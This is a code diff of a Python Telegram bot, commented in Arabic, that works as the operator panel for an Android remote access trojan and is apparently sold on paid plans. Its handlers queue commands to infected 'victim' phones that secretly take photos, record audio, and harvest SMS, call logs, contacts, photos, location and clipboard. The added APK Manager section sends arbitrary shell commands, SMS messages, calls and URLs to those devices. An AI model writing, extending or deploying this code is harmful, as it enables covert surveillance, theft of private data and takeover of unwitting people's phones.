@@ -1,7 +1,7 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# نسخة HTML (لا يوجد أخطاء Markdown) — v2
+# v3 — مع APK Manager + كل الأوامر الجديدة
 # ============================================================
 
 import io
@@ -20,6 +20,7 @@ from config import (
 from utils import trigger_victim_apk_build, get_victim_apk_url
 
 from imports_manager import (
+    # Payment / Admin
     get_or_create_user, can_use_tool, consume_usage,
     build_plans_keyboard, build_main_payment_keyboard,
     build_account_text, build_plans_text, send_invoice,
@@ -29,12 +30,17 @@ from imports_manager import (
     build_admin_menu, build_admin_users_keyboard,
     build_user_detail_keyboard, build_user_info_text,
     build_admin_stats_text,
+    # Victims
     create_victim, get_victim, get_all_victims, delete_victim,
     update_victim_status, rename_victim,
     queue_victim_command,
+    # LSH
     lsh_push_command,
+    # QR / RAT
     generate_qr_code_bytes, lsh_generate_qr,
     queue_command,
+    # APK Manager
+    build_apk_panel, push_apk_command,
 )
 
 from logging_config import get_logger
@@ -44,7 +50,7 @@ logger = get_logger("bot_handlers")
 
 
 # ============================================================
-# ★★★ Escape HTML ★★★
+# Escape HTML
 # ============================================================
 def h(text):
     """Escape HTML characters"""
@@ -54,13 +60,13 @@ def h(text):
 
 
 # ============================================================
-# ★ متغيرات عامة
+# متغيرات عامة
 # ============================================================
 _pending_open_url = {}
 
 
 # ============================================================
-# قوائم
+# القوائم
 # ============================================================
 def main_menu(user_id=None):
     markup = InlineKeyboardMarkup()
@@ -80,7 +86,7 @@ def main_menu(user_id=None):
 
 
 def victim_commands_panel(victim_id):
-    """لوحة التحكم الكاملة بالضحية — مع كل الأوامر الجديدة"""
+    """لوحة التحكم الكاملة بالضحية — مع كل الأوامر"""
     m = InlineKeyboardMarkup()
 
     # ═══════ الكاميرا ═══════
@@ -372,7 +378,7 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     # ============================================================
-    # أوامر الضحية
+    # أوامر الضحية (vcmd_)
     # ============================================================
     if data.startswith("vcmd_"):
         body = data.replace("vcmd_", "")
@@ -385,21 +391,16 @@ def _handle_callback(call, chat_id, user_id, data):
             bot.answer_callback_query(call.id, "❌ ضحية غير موجودة", show_alert=True)
             return
 
-        # ★ خريطة الأوامر الكاملة
+        # خريطة الأوامر
         action_map = {
-            # كاميرا
             "camfront": "camera_front",
             "camback": "camera_back",
             "videofront": "camera_record_front",
             "videoback": "camera_record_back",
             "video": "camera_record",
-
-            # صوت
             "audio": "record_audio",
             "sound": "play_sound",
             "alarm": "play_alarm",
-
-            # معلومات
             "info": "get_device_info",
             "battery": "get_battery",
             "sms": "get_sms",
@@ -411,37 +412,29 @@ def _handle_callback(call, chat_id, user_id, data):
             "location": "get_location",
             "wifi": "get_wifi_info",
             "clipboard": "get_clipboard",
-
-            # تحكم
             "vibrate": "vibrate",
             "volmax": "volume_max",
             "lock": "lock_screen",
             "home": "show_home",
             "screenoff": "screen_off",
-
-            # ميديا
             "mediaplay": "media_play_pause",
             "medianext": "media_next",
             "mediaprev": "media_previous",
         }
 
-        # ★ معالجة خاصة للصوت (levels)
+        # معالجة خاصة للصوت
         if action == "volmute":
             ok = queue_victim_command(victim_id, "volume_set",
                                        level=0, stream="music")
-            if ok:
-                bot.answer_callback_query(call.id, "🔉 تم خفض الصوت")
-            else:
-                bot.answer_callback_query(call.id, "❌ فشل", show_alert=True)
+            bot.answer_callback_query(call.id, "🔉 تم خفض الصوت" if ok else "❌ فشل",
+                                       show_alert=not ok)
             return
 
         if action == "volmid":
             ok = queue_victim_command(victim_id, "volume_set",
                                        level=8, stream="music")
-            if ok:
-                bot.answer_callback_query(call.id, "🔉 تم ضبط الصوت")
-            else:
-                bot.answer_callback_query(call.id, "❌ فشل", show_alert=True)
+            bot.answer_callback_query(call.id, "🔉 تم ضبط الصوت" if ok else "❌ فشل",
+                                       show_alert=not ok)
             return
 
         if action in action_map:
@@ -456,14 +449,13 @@ def _handle_callback(call, chat_id, user_id, data):
                 kwargs["ms"] = 3000
 
             ok = queue_victim_command(victim_id, real_action, **kwargs)
-            if ok:
-                bot.answer_callback_query(call.id, "✅ تم الإرسال")
-            else:
-                bot.answer_callback_query(call.id, "❌ فشل الإرسال", show_alert=True)
+            bot.answer_callback_query(call.id,
+                                       "✅ تم الإرسال" if ok else "❌ فشل",
+                                       show_alert=not ok)
             logger.info(f"Command: {action} → {victim_id[:8]}")
             return
 
-        # ★ أوامر تحتاج إدخال نصي
+        # أوامر تحتاج إدخال نصي
         if action == "toast":
             bot.answer_callback_query(call.id)
             msg = bot.send_message(chat_id, "💬 <b>أرسل النص:</b>", parse_mode="HTML")
@@ -496,6 +488,122 @@ def _handle_callback(call, chat_id, user_id, data):
             return
 
         bot.answer_callback_query(call.id, f"❓ {action}", show_alert=True)
+        return
+
+    # ============================================================
+    # أوامر APK Manager (apk_cmd_)
+    # ============================================================
+    if data.startswith("apk_cmd_"):
+        body = data.replace("apk_cmd_", "")
+
+        # الاستخراج من الآخر (device_id ممكن فيه underscores)
+        parts = body.rsplit("_", 1)
+        if len(parts) != 2:
+            bot.answer_callback_query(call.id, "❌ صيغة خاطئة", show_alert=True)
+            return
+
+        action_key, device_id = parts
+
+        # خريطة الأوامر
+        apk_action_map = {
+            "camera_front": "camera_front",
+            "camera_back": "camera_back",
+            "camera_record_front": "camera_record_front",
+            "camera_record_back": "camera_record_back",
+            "record_audio": "record_audio",
+            "play_sound": "play_sound",
+            "play_alarm": "play_alarm",
+            "info": "get_device_info",
+            "battery": "get_battery",
+            "sms": "get_sms",
+            "calls": "get_call_log",
+            "contacts": "get_contacts",
+            "apps": "get_apps",
+            "photos": "get_photos",
+            "videos": "get_videos",
+            "location": "get_location",
+            "wifi": "get_wifi_info",
+            "clipboard": "get_clipboard",
+            "vibrate": "vibrate",
+            "volume_max": "volume_max",
+            "lock_screen": "lock_screen",
+            "show_home": "show_home",
+            "screen_off": "screen_off",
+            "media_play": "media_play_pause",
+            "media_next": "media_next",
+            "media_prev": "media_previous",
+            "shell": "shell",
+        }
+
+        # أوامر الصوت الخاصة
+        if action_key == "volume_mute":
+            ok = push_apk_command(device_id, "volume_set",
+                                   level=0, stream="music")
+            bot.answer_callback_query(call.id,
+                                       "🔉 تم خفض الصوت" if ok else "❌ فشل",
+                                       show_alert=not ok)
+            return
+
+        if action_key == "volume_mid":
+            ok = push_apk_command(device_id, "volume_set",
+                                   level=8, stream="music")
+            bot.answer_callback_query(call.id,
+                                       "⚡ تم ضبط الصوت" if ok else "❌ فشل",
+                                       show_alert=not ok)
+            return
+
+        # أوامر تحتاج إدخال نصي
+        if action_key == "toast":
+            bot.answer_callback_query(call.id)
+            msg = bot.send_message(chat_id, "💬 <b>أرسل النص:</b>", parse_mode="HTML")
+            bot.register_next_step_handler(msg, lambda m: apk_toast_step(m, device_id))
+            return
+
+        if action_key == "shell":
+            bot.answer_callback_query(call.id)
+            msg = bot.send_message(chat_id, "💻 <b>أرسل الأمر:</b>", parse_mode="HTML")
+            bot.register_next_step_handler(msg, lambda m: apk_shell_step(m, device_id))
+            return
+
+        if action_key == "send_sms":
+            bot.answer_callback_query(call.id)
+            msg = bot.send_message(chat_id,
+                "✉️ <b>أرسل:</b> <code>رقم|نص</code>", parse_mode="HTML")
+            bot.register_next_step_handler(msg, lambda m: apk_sendsms_step(m, device_id))
+            return
+
+        if action_key == "call":
+            bot.answer_callback_query(call.id)
+            msg = bot.send_message(chat_id, "📞 <b>أرسل الرقم:</b>", parse_mode="HTML")
+            bot.register_next_step_handler(msg, lambda m: apk_call_step(m, device_id))
+            return
+
+        if action_key == "open_url":
+            bot.answer_callback_query(call.id)
+            msg = bot.send_message(chat_id, "🌐 <b>أرسل الرابط:</b>", parse_mode="HTML")
+            bot.register_next_step_handler(msg, lambda m: apk_url_step(m, device_id))
+            return
+
+        # الأوامر العادية
+        if action_key in apk_action_map:
+            real_action = apk_action_map[action_key]
+            kwargs = {}
+
+            if "camera_record" in action_key:
+                kwargs["duration"] = 10000
+            elif action_key == "record_audio":
+                kwargs["duration"] = 10000
+            elif action_key == "vibrate":
+                kwargs["ms"] = 3000
+
+            ok = push_apk_command(device_id, real_action, **kwargs)
+            bot.answer_callback_query(call.id,
+                                       "✅ تم الإرسال" if ok else "❌ فشل",
+                                       show_alert=not ok)
+            logger.info(f"APK Command: {action_key} → {device_id[:8]}")
+            return
+
+        bot.answer_callback_query(call.id, f"❓ {action_key}", show_alert=True)
         return
 
     # ============================================================
@@ -1127,7 +1235,6 @@ def victim_name_step(message):
                 logger.warning(f"edit_message_text error: {e}")
             return
 
-        # ★ تحديث الرسالة
         try:
             bot.edit_message_text(
                 f"✅ <b>تم تشغيل البناء بنجاح</b>\n\n"
@@ -1198,6 +1305,10 @@ def victim_name_step(message):
 
     threading.Thread(target=build_and_send, daemon=True).start()
 
+
+# ============================================================
+# Step Handlers — Victims
+# ============================================================
 
 def v_toast_step(message, victim_id):
     if not message.text:
@@ -1286,6 +1397,50 @@ def victim_rename_handler(message, victim_id):
     bot.send_message(message.chat.id,
                      f"✅ <b>تم التغيير إلى:</b> <code>{h(new_name)}</code>",
                      parse_mode="HTML")
+
+
+# ============================================================
+# Step Handlers — APK Manager
+# ============================================================
+
+def apk_toast_step(message, device_id):
+    if not message.text:
+        return
+    push_apk_command(device_id, "toast", text=message.text)
+    bot.send_message(message.chat.id, "✅ تم إرسال Toast")
+
+
+def apk_shell_step(message, device_id):
+    if not message.text:
+        return
+    push_apk_command(device_id, "shell", command=message.text)
+    bot.send_message(message.chat.id, "✅ تم إرسال الأمر")
+
+
+def apk_sendsms_step(message, device_id):
+    if not message.text:
+        return
+    parts = message.text.split("|")
+    if len(parts) != 2:
+        bot.send_message(message.chat.id, "❌ استخدم: <code>رقم|نص</code>", parse_mode="HTML")
+        return
+    push_apk_command(device_id, "send_sms",
+                     to=parts[0].strip(), msg=parts[1].strip())
+    bot.send_message(message.chat.id, "✅ تم إرسال SMS")
+
+
+def apk_call_step(message, device_id):
+    if not message.text:
+        return
+    push_apk_command(device_id, "call", to=message.text.strip())
+    bot.send_message(message.chat.id, "✅ تم بدء المكالمة")
+
+
+def apk_url_step(message, device_id):
+    if not message.text:
+        return
+    push_apk_command(device_id, "open_url", url=message.text.strip())
+    bot.send_message(message.chat.id, "✅ تم فتح الرابط")
 
 
 # ============================================================
